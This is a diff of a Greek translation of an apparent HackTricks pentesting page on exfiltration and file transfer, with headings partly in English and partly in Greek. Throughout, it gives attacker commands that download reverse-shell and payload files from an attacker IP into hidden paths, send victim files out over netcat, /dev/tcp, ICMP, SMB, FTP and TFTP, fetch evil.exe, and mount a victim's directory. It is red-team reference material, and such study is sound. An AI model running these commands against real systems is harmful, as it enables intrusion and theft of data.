@@ -1,54 +1,46 @@
-# Εξυφαίρεση
+# Exfiltration
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Υποστηρίξτε το HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
+## Κοινά whitelist domains για εξαγωγή πληροφοριών
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-## Συνήθως εγκριμένοι τομείς για εξύφανση πληροφοριών
-
-Ελέγξτε το [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνήθως εγκριμένους τομείς που μπορούν να καταχραστούν
-
-## Αντιγραφή\&Επικόλληση Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**Παράθυρα**
+**Windows**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
 ## HTTP
 
-**Linux**
+**Λίνουξ**
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-**Παράθυρα**
+**Windows**
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -63,11 +55,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Μεταφόρτωση αρχείων
+### Upload files
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer εκτύπωση GET και POSTs (επίσης headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-* Πρόσθετο Python [uploadserver](https://pypi.org/project/uploadserver/):
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -80,7 +72,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **Διακομιστής HTTPS**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -123,7 +115,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTP εξυπηρετητής (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -151,7 +143,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Πελάτης Windows**
+### **Windows** πελάτης
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -164,14 +156,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Κάλι ως διακομιστής
+Kali ως διακομιστής
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ή δημιουργήστε ένα smb share **χρησιμοποιώντας το samba**:
+Ή δημιουργήστε ένα smb share **χρησιμοποιώντας samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -187,36 +179,6 @@ guest ok = Yes
 service smbd restart
 ```
 Windows
-
----
-
-### Exfiltration Techniques
-
-#### Data Compression
-
-Data compression is a common technique used to reduce the size of exfiltrated data. This can be achieved using various algorithms such as gzip, bzip2, or custom compression methods.
-
-#### Data Encryption
-
-Encrypting exfiltrated data ensures that even if the data is intercepted, it remains secure and cannot be easily accessed by unauthorized parties. Strong encryption algorithms such as AES are commonly used for this purpose.
-
-#### Data Fragmentation
-
-Breaking down exfiltrated data into smaller fragments can help avoid detection and make it harder for security controls to identify and block the exfiltration. The fragmented data can later be reassembled by the attacker.
-
-#### Data Obfuscation
-
-Obfuscating exfiltrated data involves disguising the data to make it unintelligible to anyone other than the intended recipient. This can be achieved through techniques such as base64 encoding, XOR encryption, or using steganography to hide data within other files or images.
-
-#### Data Hiding
-
-Hiding exfiltrated data within seemingly innocuous files or locations can help evade detection. Attackers may hide data within image files, text documents, or even unused sectors on a disk to avoid raising suspicion.
-
-#### Covert Channels
-
-Covert channels are communication channels that are hidden within legitimate network traffic or protocols. Attackers can use covert channels to exfiltrate data without triggering security alerts, as the communication appears to be normal traffic.
-
-By combining these exfiltration techniques, attackers can effectively exfiltrate data from a target network without being detected.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -232,32 +194,32 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Αν το θύμα έχει SSH, ο επιτιθέμενος μπορεί να προσαρτήσει έναν κατάλογο από το θύμα στον επιτιθέμενο.
+Αν το θύμα έχει SSH, ο επιτιθέμενος μπορεί να προσαρτήσει έναν φάκελο από το θύμα στον επιτιθέμενο.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## Εξωτερική μεταφορά
+## NC
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Λήψη αρχείου από το θύμα
+### Κατέβασμα αρχείου από το θύμα
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Μεταφόρτωση αρχείου στο θύμα
+### Αποστολή αρχείου στον θύμα
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Ευχαριστίες στον **@BinaryShadow\_**
+ευχαριστίες στον **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -279,7 +241,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Αν μπορείτε να στείλετε δεδομένα σε έναν διακομιστή SMTP, μπορείτε να δημιουργήσετε έναν SMTP για να λάβετε τα δεδομένα με τη χρήση της Python:
+Αν μπορείτε να στείλετε δεδομένα σε έναν διακομιστή SMTP, μπορείτε να δημιουργήσετε έναν SMTP για να λάβετε τα δεδομένα με python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -294,18 +256,18 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Διακομιστής TFTP σε Python:**
+**TFTP server σε python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Στο **θύμα**, συνδεθείτε στον διακομιστή Kali:
+Στο **θύμα**, συνδεθείτε με τον διακομιστή Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Κατεβάστε ένα αρχείο με ένα PHP oneliner:
+Κατεβάστε ένα αρχείο με μια PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -347,14 +309,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση των δυαδικών αρχείων, αλλά έχει επίσης τη **δυνατότητα να τα ξαναχτίσει από hex**. Αυτό σημαίνει ότι παρέχοντας ένα hex ενός δυαδικού αρχείου, το `debug.exe` μπορεί να δημιουργήσει το δυαδικό αρχείο. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει μια **περιορισμένη δυνατότητα συναρμολόγησης αρχείων μέχρι 64 kb σε μέγεθος**.
+Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση δυαδικών αρχείων αλλά έχει επίσης τη **δυνατότητα να τα ξαναχτίσει από hex**. Αυτό σημαίνει ότι παρέχοντας ένα hex ενός δυαδικού αρχείου, το `debug.exe` μπορεί να δημιουργήσει το δυαδικό αρχείο. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει μια **περιορισμένη δυνατότητα συναρμολόγησης αρχείων έως 64 kb σε μέγεθος**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```markdown
-Στη συνέχεια αντιγράψτε και επικολλήστε το κείμενο στο παράθυρο κελύφους των Windows και θα δημιουργηθεί ένα αρχείο με το όνομα nc.exe.
+Στη συνέχεια, επικολλήστε το κείμενο στο windows-shell και θα δημιουργηθεί ένα αρχείο με όνομα nc.exe.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -362,24 +323,17 @@ wine exe2bat.exe nc.exe nc.txt
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Υποστηρίξτε το HackTricks</summary>
+<summary>Υποστήριξη HackTricks</summary>
 
 * Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
-```
